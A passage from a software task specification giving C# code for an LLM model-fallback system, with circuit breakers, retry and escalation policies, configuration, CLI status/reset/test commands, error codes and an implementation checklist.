            var circuit = GetOrCreateCircuit(modelId);
            if (!circuit.ShouldAllow())
            {
                _logger.LogDebug("Skipping {ModelId}: circuit is {State}", modelId, circuit.State);
                continue;
            }

            // Check availability
            if (!_registry.IsAvailable(modelId))
            {
                _logger.LogDebug("Skipping {ModelId}: unavailable", modelId);
                continue;
            }

            // Found available fallback
            _logger.LogWarning(
                "Fallback triggered: {OriginalModel} → {FallbackModel} (trigger: {Trigger})",
                context.OriginalModel, modelId, context.Trigger);

            return new FallbackResult
            {
                Success = true,
                ModelId = modelId,
                Reason = $"{context.OriginalModel} {context.Trigger.ToString().ToLower()}, using {modelId}",
                TriedModels = triedModels
            };
        }

        // All fallbacks exhausted
        _logger.LogError(
            "All fallbacks exhausted for role {Role}. Tried: {Models}",
            role, string.Join(", ", triedModels));

        return new FallbackResult
        {
            Success = false,
            Reason = $"All fallbacks exhausted. Tried: {string.Join(", ", triedModels)}",
            TriedModels = triedModels
        };
    }

    /// <inheritdoc/>
    public void NotifyFailure(string modelId, Exception error)
    {
        var circuit = GetOrCreateCircuit(modelId);
        circuit.RecordFailure();

        if (circuit.State == CircuitState.Open)
        {
            _logger.LogWarning(
                "Circuit opened for {ModelId} after {Failures} failures. Cooling for {Period}s",
                modelId, circuit.FailureCount, _config.CoolingPeriod.TotalSeconds);
        }
    }

    /// <inheritdoc/>
    public bool IsCircuitOpen(string modelId)
    {
        var circuit = GetOrCreateCircuit(modelId);
        return circuit.State == CircuitState.Open;
    }

    /// <inheritdoc/>
    public void ResetCircuit(string modelId)
    {
        if (_circuits.TryGetValue(modelId, out var circuit))
        {
            circuit.Reset();
            _logger.LogInformation("Circuit reset for {ModelId}", modelId);
        }
    }

    /// <inheritdoc/>
    public void ResetAllCircuits()
    {
        foreach (var kvp in _circuits)
        {
            kvp.Value.Reset();
        }

        _logger.LogInformation("All circuits reset");
    }

    private IReadOnlyList<string> GetFallbackChain(AgentRole role)
    {
        // Role-specific chain takes precedence
        var roleChain = _config.GetRoleChain(role);
        if (roleChain.Any())
            return roleChain;

        // Fall back to global chain
        return _config.GetGlobalChain();
    }

    private CircuitBreaker GetOrCreateCircuit(string modelId)
    {
        return _circuits.GetOrAdd(modelId, _ =>
            new CircuitBreaker(_config.FailureThreshold, _config.CoolingPeriod));
    }
}
```

### Escalation Policy Implementations

**File: src/Acode.Infrastructure/Fallback/IEscalationPolicy.cs**

```csharp
namespace Acode.Infrastructure.Fallback;

/// <summary>
/// Strategy for handling model failures and escalation.
/// </summary>
public interface IEscalationPolicy
{
    /// <summary>
    /// Determines if fallback should be triggered for given context.
    /// </summary>
    bool ShouldTriggerFallback(FallbackContext context, IModelProvider provider);
}
```

**File: src/Acode.Infrastructure/Fallback/ImmediatePolicy.cs**

```csharp
namespace Acode.Infrastructure.Fallback;

/// <summary>
/// Immediately falls back on first failure (zero retries).
/// </summary>
public sealed class ImmediatePolicy : IEscalationPolicy
{
    public bool ShouldTriggerFallback(FallbackContext context, IModelProvider provider)
    {
        // Check availability once, fallback if unavailable
        return !provider.IsAvailable(context.OriginalModel);
    }
}
```

**File: src/Acode.Infrastructure/Fallback/RetryThenFallbackPolicy.cs**

```csharp
namespace Acode.Infrastructure.Fallback;

/// <summary>
/// Retries primary model N times before falling back.
/// </summary>
public sealed class RetryThenFallbackPolicy : IEscalationPolicy
{
    private readonly int _retries;
    private readonly TimeSpan _retryDelay;

    public RetryThenFallbackPolicy(int retries, TimeSpan retryDelay)
    {
        _retries = retries;
        _retryDelay = retryDelay;
    }

    public bool ShouldTriggerFallback(FallbackContext context, IModelProvider provider)
    {
        for (int attempt = 0; attempt <= _retries; attempt++)
        {
            if (provider.IsAvailable(context.OriginalModel))
                return false; // Model available, no fallback needed

            if (attempt < _retries)
            {
                // Wait before retry (exponential backoff)
                var delay = _retryDelay.TotalMilliseconds * Math.Pow(2, attempt);
                Thread.Sleep((int)delay);
            }
        }

        // Retries exhausted, trigger fallback
        return true;
    }
}
```

**File: src/Acode.Infrastructure/Fallback/CircuitBreakerPolicy.cs**

```csharp
namespace Acode.Infrastructure.Fallback;

/// <summary>
/// Combines retry logic with circuit breaker pattern.
/// </summary>
public sealed class CircuitBreakerPolicy : IEscalationPolicy
{
    private readonly CircuitBreaker _circuitBreaker;

    public CircuitBreakerPolicy(CircuitBreaker circuitBreaker)
    {
        _circuitBreaker = circuitBreaker ?? throw new ArgumentNullException(nameof(circuitBreaker));
    }

    public bool ShouldTriggerFallback(FallbackContext context, IModelProvider provider)
    {
        // If circuit is open, immediate fallback
        if (!_circuitBreaker.ShouldAllow())
            return true;

        // Circuit closed or half-open, check availability
        if (provider.IsAvailable(context.OriginalModel))
        {
            _circuitBreaker.RecordSuccess();
            return false;
        }

        // Model unavailable, record failure and trigger fallback
        _circuitBreaker.RecordFailure();
        return true;
    }
}
```

### Configuration

**File: src/Acode.Application/Fallback/IFallbackConfiguration.cs**

```csharp
namespace Acode.Application.Fallback;

/// <summary>
/// Configuration for fallback escalation.
/// </summary>
public interface IFallbackConfiguration
{
    /// <summary>
    /// Global fallback chain (applies to all roles if no role-specific chain configured).
    /// </summary>
    IReadOnlyList<string> GetGlobalChain();

    /// <summary>
    /// Role-specific fallback chain.
    /// </summary>
    IReadOnlyList<string> GetRoleChain(AgentRole role);

    /// <summary>
    /// Escalation policy (immediate, retry-then-fallback, circuit-breaker).
    /// </summary>
    string Policy { get; }

    /// <summary>
    /// Number of retries before fallback (for retry-then-fallback policy).
    /// </summary>
    int Retries { get; }

    /// <summary>
    /// Delay between retries in milliseconds.
    /// </summary>
    TimeSpan RetryDelay { get; }

    /// <summary>
    /// Circuit breaker failure threshold.
    /// </summary>
    int FailureThreshold { get; }

    /// <summary>
    /// Circuit breaker cooling period.
    /// </summary>
    TimeSpan CoolingPeriod { get; }

    /// <summary>
    /// Whether to notify user of fallback events.
    /// </summary>
    bool NotifyUser { get; }

    /// <summary>
    /// Escalation scope (role-scoped or global-scoped).
    /// </summary>
    string Scope { get; }
}
```

**File: src/Acode.Infrastructure/Configuration/FallbackConfiguration.cs**

```csharp
namespace Acode.Infrastructure.Configuration;

/// <summary>
/// Fallback configuration loaded from config.yml.
/// </summary>
public sealed class FallbackConfiguration : IFallbackConfiguration
{
    private readonly IConfiguration _config;

    public FallbackConfiguration(IConfiguration config)
    {
        _config = config ?? throw new ArgumentNullException(nameof(config));
    }

    public IReadOnlyList<string> GetGlobalChain()
    {
        return _config.GetSection("models:fallback:global")
            .Get<List<string>>() ?? new List<string>();
    }

    public IReadOnlyList<string> GetRoleChain(AgentRole role)
    {
        var key = $"models:fallback:roles:{role.ToString().ToLower()}";
        return _config.GetSection(key).Get<List<string>>() ?? new List<string>();
    }

    public string Policy =>
        _config["models:fallback:policy"] ?? "retry-then-fallback";

    public int Retries =>
        _config.GetValue<int>("models:fallback:retries", 2);

    public TimeSpan RetryDelay =>
        TimeSpan.FromMilliseconds(_config.GetValue<int>("models:fallback:retry_delay_ms", 1000));

    public int FailureThreshold =>
        _config.GetValue<int>("models:fallback:circuit_breaker:failure_threshold", 5);

    public TimeSpan CoolingPeriod =>
        TimeSpan.FromMilliseconds(_config.GetValue<int>("models:fallback:circuit_breaker:cooling_period_ms", 60000));

    public bool NotifyUser =>
        _config.GetValue<bool>("models:fallback:notify_user", false);

    public string Scope =>
        _config["models:fallback:scope"] ?? "role-scoped";
}
```

### CLI Commands

**File: src/Acode.CLI/Commands/FallbackStatusCommand.cs**

```csharp
namespace Acode.CLI.Commands;

/// <summary>
/// Displays fallback configuration and circuit breaker state.
/// </summary>
public sealed class FallbackStatusCommand : ICommand
{
    private readonly IFallbackHandler _fallbackHandler;
    private readonly IFallbackConfiguration _config;
    private readonly IModelProviderRegistry _registry;
    private readonly IConsole _console;

    public FallbackStatusCommand(
        IFallbackHandler fallbackHandler,
        IFallbackConfiguration config,
        IModelProviderRegistry registry,
        IConsole console)
    {
        _fallbackHandler = fallbackHandler;
        _config = config;
        _registry = registry;
        _console = console;
    }

    public Task<int> ExecuteAsync(CancellationToken cancellationToken)
    {
        _console.WriteLine("Fallback Configuration:");
        _console.WriteLine($"  Policy: {_config.Policy}");
        _console.WriteLine($"  Scope: {_config.Scope}");
        _console.WriteLine();

        // Global chain
        var globalChain = _config.GetGlobalChain();
        if (globalChain.Any())
        {
            _console.WriteLine("Global Chain:");
            for (int i = 0; i < globalChain.Count; i++)
            {
                var modelId = globalChain[i];
                var available = _registry.IsAvailable(modelId) ? "available" : "unavailable";
                _console.WriteLine($"  {i + 1}. {modelId} ({available})");
            }
            _console.WriteLine();
        }

        // Role chains
        _console.WriteLine("Role Chains:");
        foreach (var role in Enum.GetValues<AgentRole>())
        {
            var chain = _config.GetRoleChain(role);
            if (chain.Any())
            {
                _console.WriteLine($"  {role.ToString().ToLower()}:");
                for (int i = 0; i < chain.Count; i++)
                {
                    var modelId = chain[i];
                    var available = _registry.IsAvailable(modelId) ? "available" : "unavailable";
                    _console.WriteLine($"    {i + 1}. {modelId} ({available})");
                }
            }
        }
        _console.WriteLine();

        // Circuit breaker state
        _console.WriteLine("Circuit Breaker State:");
        var allModels = globalChain.Concat(_config.GetRoleChain(AgentRole.Planner)).Distinct();
        foreach (var modelId in allModels)
        {
            var isOpen = _fallbackHandler.IsCircuitOpen(modelId);
            var state = isOpen ? "OPEN" : "CLOSED";
            _console.WriteLine($"  {modelId}: {state}");
        }

        return Task.FromResult(0);
    }
}
```

**File: src/Acode.CLI/Commands/FallbackResetCommand.cs**

```csharp
namespace Acode.CLI.Commands;

/// <summary>
/// Resets circuit breakers for one or all models.
/// </summary>
public sealed class FallbackResetCommand : ICommand
{
    private readonly IFallbackHandler _fallbackHandler;
    private readonly IConsole _console;
    private readonly string? _modelId;
    private readonly bool _all;

    public FallbackResetCommand(
        IFallbackHandler fallbackHandler,
        IConsole console,
        string? modelId = null,
        bool all = false)
    {
        _fallbackHandler = fallbackHandler;
        _console = console;
        _modelId = modelId;
        _all = all;
    }

    public Task<int> ExecuteAsync(CancellationToken cancellationToken)
    {
        if (_all)
        {
            _fallbackHandler.ResetAllCircuits();
            _console.WriteLine("All circuit breakers reset.");
        }
        else if (!string.IsNullOrEmpty(_modelId))
        {
            _fallbackHandler.ResetCircuit(_modelId);
            _console.WriteLine($"Circuit breaker reset for {_modelId}");
        }
        else
        {
            _console.Error.WriteLine("Error: Specify --model or --all");
            return Task.FromResult(1);
        }

        return Task.FromResult(0);
    }
}
```

**File: src/Acode.CLI/Commands/FallbackTestCommand.cs**

```csharp
namespace Acode.CLI.Commands;

/// <summary>
/// Tests fallback chain for a role by checking availability and latency.
/// </summary>
public sealed class FallbackTestCommand : ICommand
{
    private readonly IFallbackConfiguration _config;
    private readonly IModelProviderRegistry _registry;
    private readonly IConsole _console;
    private readonly string _roleName;

    public FallbackTestCommand(
        IFallbackConfiguration config,
        IModelProviderRegistry registry,
        IConsole console,
        string roleName)
    {
        _config = config;
        _registry = registry;
        _console = console;
        _roleName = roleName;
    }

    public async Task<int> ExecuteAsync(CancellationToken cancellationToken)
    {
        if (!Enum.TryParse<AgentRole>(_roleName, ignoreCase: true, out var role))
        {
            _console.Error.WriteLine($"Error: Unknown role '{_roleName}'");
            return 1;
        }

        var chain = _config.GetRoleChain(role);
        if (!chain.Any())
            chain = _config.GetGlobalChain();

        _console.WriteLine($"Testing fallback chain for '{role.ToString().ToLower()}':");

        var allHealthy = true;
        foreach (var modelId in chain)
        {
            var stopwatch = System.Diagnostics.Stopwatch.StartNew();
            var available = await Task.Run(() => _registry.IsAvailable(modelId), cancellationToken);
            stopwatch.Stop();

            var status = available ? "OK" : "UNAVAILABLE";
            var latency = $"({stopwatch.ElapsedMilliseconds}ms)";

            _console.WriteLine($"  {modelId}: {status} {latency}");

            if (!available)
                allHealthy = false;
        }

        _console.WriteLine(allHealthy ? "Chain is healthy." : "Chain has issues.");

        return allHealthy ? 0 : 1;
    }
}
```

### Error Codes

| Code | Message |
|------|---------|
| ACODE-FBK-001 | All fallbacks exhausted |
| ACODE-FBK-002 | Circuit breaker open |
| ACODE-FBK-003 | Model timeout |
| ACODE-FBK-004 | Invalid fallback chain |
| ACODE-FBK-005 | Mode constraint violation |

### Logging Fields

```json
{
  "event": "fallback_escalation",
  "role": "planner",
  "original_model": "llama3.2:70b",
  "fallback_model": "llama3.2:7b",
  "trigger": "request_timeout",
  "trigger_detail": "65000ms > 60000ms limit",
  "circuit_state": "closed"
}
```

### Implementation Checklist

1. [ ] Create IFallbackHandler interface
2. [ ] Create FallbackResult class
3. [ ] Create EscalationTrigger enum
4. [ ] Create FallbackConfiguration class
5. [ ] Implement CircuitBreaker
6. [ ] Implement ImmediatePolicy
7. [ ] Implement RetryPolicy
8. [ ] Implement CircuitBreakerPolicy
9. [ ] Implement FallbackHandler
10. [ ] Implement FallbackChainResolver
11. [ ] Add CLI commands
12. [ ] Write unit tests
13. [ ] Write integration tests
14. [ ] Add XML documentation

### Verification Command

```bash
dotnet test --filter "FullyQualifiedName~Fallback"
```

---

**End of Task 009.c Specification**